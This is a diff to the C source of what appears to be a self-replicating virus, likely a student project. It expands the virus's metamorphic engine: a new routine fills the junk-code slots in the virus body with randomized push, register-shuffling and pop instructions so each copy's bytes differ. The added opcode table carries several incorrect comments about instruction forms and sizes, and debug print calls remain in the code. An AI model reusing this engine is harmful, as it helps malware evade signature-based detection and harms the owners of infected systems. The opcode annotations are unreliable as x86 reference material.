@@ -11,6 +11,7 @@
 
 extern void __attribute__((naked)) _start(void);
 extern void end(void);
+extern int64_t g_key;
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
@@ -59,7 +60,8 @@ static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
 	}
 }
 
-enum e_opcode {
+//  3 bytes opcodes
+enum e_opcode3 {
 
 	OPCODE_XCHG  = 0x87,
 	OPCODE_MOV   = 0x8B,
@@ -82,7 +84,46 @@ enum e_opcode {
 	OPCODE_CMP  = 0x39,
 };
 
-static uint8_t get_random_opcode(uint8_t rand) {
+enum e_opcode4 {
+    OPCODE_ADD_IMM     = 0x83, // 3 or 4 bytes (when adding immediate)
+    OPCODE_MOV_RM_IMM  = 0xC7, // 4 bytes (moving immediate into memory)
+    OPCODE_MUL_IMM     = 0xF7, // 4 bytes (multiplying with an immediate)
+    OPCODE_IMUL_IMM    = 0x69, // 4 bytes (signed multiply with immediate)
+    OPCODE_XOR_IMM     = 0x83, // 3 or 4 bytes (XOR with immediate)
+    OPCODE_AND_IMM     = 0x83, // 3 or 4 bytes (AND with immediate)
+    OPCODE_OR_IMM      = 0x83, // 3 or 4 bytes (OR with immediate)
+    OPCODE_SUB_IMM     = 0x83, // 3 or 4 bytes (SUB with immediate)
+    OPCODE_CMP_IMM     = 0x83, // 3 or 4 bytes (CMP with immediate)
+    OPCODE_TEST_IMM    = 0xF6, // 4 bytes (TEST with immediate)
+    OPCODE_ADC_IMM     = 0x83, // 3 or 4 bytes (ADC with immediate)
+    OPCODE_SBB_IMM     = 0x83, // 3 or 4 bytes (SBB with immediate)
+    OPCODE_MOVSX_IMM   = 0x63, // 4 bytes (MOVSX with immediate)
+    OPCODE_MOVZX_IMM   = 0x0F, // 4 bytes (MOVZX with immediate)
+    OPCODE_LEA_IMM     = 0x8D, // 4 bytes (LEA with an immediate)
+    OPCODE_PUSH_IMM    = 0x6A, // 4 bytes (PUSH immediate)
+    OPCODE_POP_IMM     = 0x8F, // 4 bytes (POP immediate)
+    OPCODE_CALL_IMM    = 0xE8, // 4 bytes (CALL immediate address)
+    OPCODE_JMP_IMM     = 0xE9, // 4 bytes (JMP immediate address)
+    OPCODE_TEST_RM_IMM = 0xF6, // 4 bytes (TEST with r/m operand and immediate)
+    OPCODE_CMP_RM_IMM = 0x81, // 4 bytes (CMP with r/m operand and immediate)
+    OPCODE_CMP_R_RM   = 0x3B, // 4 bytes (CMP reg, r/m)
+    OPCODE_MOV_R_RM_IMM = 0xC6, // 4 bytes (MOV r, r/m with immediate)
+    OPCODE_MUL_RM_IMM = 0xF7, // 4 bytes (MUL r/m with immediate)
+    OPCODE_DIV_RM_IMM = 0xF7, // 4 bytes (DIV r/m with immediate)
+    OPCODE_NEG_RM_IMM = 0xF7, // 4 bytes (NEG r/m with immediate)
+    OPCODE_CWD_IMM    = 0x99, // 4 bytes (CWD with immediate operand)
+    OPCODE_CDQ_IMM    = 0x99, // 4 bytes (CDQ with immediate operand)
+    OPCODE_LGDT_IMM   = 0x0F, // 4 bytes (LGDT with immediate operand)
+    OPCODE_LIDT_IMM   = 0x0F, // 4 bytes (LIDT with immediate operand)
+    OPCODE_SGDT_IMM   = 0x0F, // 4 bytes (SGDT with immediate operand)
+    OPCODE_SIDT_IMM   = 0x0F, // 4 bytes (SIDT with immediate operand)
+    OPCODE_FPU_FSTP   = 0xD9, // 4 bytes (FPU operations like FSTP)
+    OPCODE_FPU_FLD    = 0xD8, // 4 bytes (FPU operations like FLD)
+};
+
+
+
+static uint8_t get_random_opcode3(uint8_t rand) {
 	const uint8_t opcodes[] = {
 		OPCODE_XCHG,
 		OPCODE_MOV,
@@ -104,20 +145,116 @@ static uint8_t get_random_opcode(uint8_t rand) {
 
 }
 
+//static uint8_t get_random_opcode4(uint8_t rand) {
+//	const uint8_t opcodes[] = {
+//		OPCODE_ADD_IMM,
+//		OPCODE_MOV_RM_IMM,
+//		OPCODE_MUL_IMM,
+//		OPCODE_IMUL_IMM,
+//		OPCODE_XOR_IMM,
+//		OPCODE_AND_IMM,
+//		OPCODE_OR_IMM,
+//		OPCODE_SUB_IMM,
+//		OPCODE_CMP_IMM,
+//		OPCODE_TEST_IMM,
+//		OPCODE_ADC_IMM,
+//		OPCODE_SBB_IMM,
+//		OPCODE_MOVSX_IMM,
+//		OPCODE_MOVZX_IMM,
+//		OPCODE_LEA_IMM,
+//		OPCODE_PUSH_IMM,
+//		OPCODE_POP_IMM,
+//		OPCODE_CALL_IMM,
+//		OPCODE_JMP_IMM,
+//		OPCODE_TEST_RM_IMM,
+//		OPCODE_CMP_RM_IMM,
+//		OPCODE_CMP_R_RM,
+//		OPCODE_MOV_R_RM_IMM,
+//		OPCODE_MUL_RM_IMM,
+//		OPCODE_DIV_RM_IMM,
+//		OPCODE_NEG_RM_IMM,
+//		OPCODE_CWD_IMM,
+//		OPCODE_CDQ_IMM,
+//		OPCODE_LGDT_IMM,
+//		OPCODE_LIDT_IMM,
+//		OPCODE_SGDT_IMM,
+//		OPCODE_SIDT_IMM,
+//		OPCODE_FPU_FSTP,
+//		OPCODE_FPU_FLD
+//	};
+//
+//	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
+//}
+
+static inline uint8_t ft_nrand(void) {
+	uint8_t rand = g_rand[g_ri];
+	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
+	return rand;
+}
+
+static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2) {
+
+
+	int nop_size = JUNK_LEN - 4;
+	int bytes_len = 0;
+	int offset = 0;
+
+	while (nop_size > 0) {
+		bytes_len = (ft_nrand() % 3) + 2;
+		if (nop_size < bytes_len) {
+			bytes_len = nop_size;
+		}
+
+		_printf("bytes_len: %d\n", bytes_len);
+
+
+		if (offset + bytes_len > JUNK_LEN) {
+			bytes_len = JUNK_LEN - offset;
+		}
+
+		if (bytes_len == 0) {
+			break;
+		}
+		else if (bytes_len == 1) {
+			nop[offset] = 0x90;
+		} 
+		else if (bytes_len == 2) {
+
+			if (ft_nrand() % 2) {
+				nop[offset] = 0xEB;
+				nop[offset + 1] = 0x00;
+			} else {
+				nop[offset] = 0x85;
+				nop[offset + 1] = 0xC0 | (reg_1 << 3) | reg_1;
+			}
+		} else {
+
+			nop[offset] = 0x48;
+			nop[offset + 1] = get_random_opcode3(ft_nrand());
+
+			if (bytes_len >= 3) {
+				nop[offset + 2] = 0xC0 + reg_1 + (reg_2 << 3);
+			}
+
+			if (bytes_len == 4) {
+				nop[offset + 3] = 0x90;
+			}
+		}
+
+		offset += bytes_len;
+		nop_size -= bytes_len;
+
+	}
+}
+
 static void gen_junk(uint8_t *rdm_junk) {
 
 	uint8_t reg_1 = 4;
 	uint8_t reg_2 = 4;
 
-
 	/* check is rsp */
-	for (; g_ri < RAND_SIZE && reg_1 == 4; g_ri++) {
-		reg_1 = g_rand[g_ri % RAND_SIZE] % 8;
-	}
-
-	for (; g_ri < RAND_SIZE && (reg_2 == 4 || reg_2 == reg_1); g_ri++) {
-		reg_2 = g_rand[(g_ri + 1) % RAND_SIZE] % 8;
-	}
+	while (reg_1 == 4) reg_1 = ft_nrand() % 8;
+	while (reg_2 == 4 || reg_2 == reg_1) reg_2 = ft_nrand() % 8;
 
 	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
 		reg_1 = 0;
@@ -132,30 +269,17 @@ static void gen_junk(uint8_t *rdm_junk) {
 	uint8_t pop_1 = POP_OP + reg_1;
 	uint8_t pop_2 = POP_OP + reg_2;
 
-	uint8_t nop_1[3] = {OP_64, XCHG, RAX_RAX};
-	uint8_t nop_2[3] = {OP_64, XCHG, RAX_RAX};
-
-	uint8_t opcode_1 = get_random_opcode(g_rand[g_ri % RAND_SIZE]);
-	uint8_t opcode_2 = get_random_opcode(g_rand[(g_ri + 1) % RAND_SIZE]);
-
-	nop_1[1] = opcode_1;
-	nop_1[2] += reg_1;
-	nop_1[2] += (reg_2 << 3);
-
-	nop_2[1] = opcode_2;
-	nop_2[2] += reg_2;
-	nop_2[2] += (reg_1 << 3);
+	uint8_t nop[NOPS_LEN];
+	fill_nop(nop, reg_1, reg_2);
 
 	rdm_junk[0] = push_1;
 	rdm_junk[1] = push_2;
-	rdm_junk[2] = nop_1[0];
-	rdm_junk[3] = nop_1[1];
-	rdm_junk[4] = nop_1[2];
-	rdm_junk[5] = nop_2[0];
-	rdm_junk[6] = nop_2[1];
-	rdm_junk[7] = nop_2[2];
-	rdm_junk[8] = pop_2;
-	rdm_junk[9] = pop_1;
+
+	ft_memcpy(rdm_junk + 2, nop, NOPS_LEN);
+	_printf("%x %x %x %x %x %x\n", nop[0], nop[1], nop[2], nop[3], nop[4], nop[5]);
+
+	rdm_junk[JUNK_LEN - 2] = pop_2;
+	rdm_junk[JUNK_LEN - 1] = pop_1;
 
 	JUNK;
 }
@@ -167,7 +291,7 @@ static void replace_nop(uint8_t *self, int *junk_offsets) {
 		if (junk_offsets[i] == 0) {
 			break;
 		}
-		uint8_t rdm_junk[10];
+		uint8_t rdm_junk[JUNK_LEN];
 		gen_junk(rdm_junk);
 		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);
 
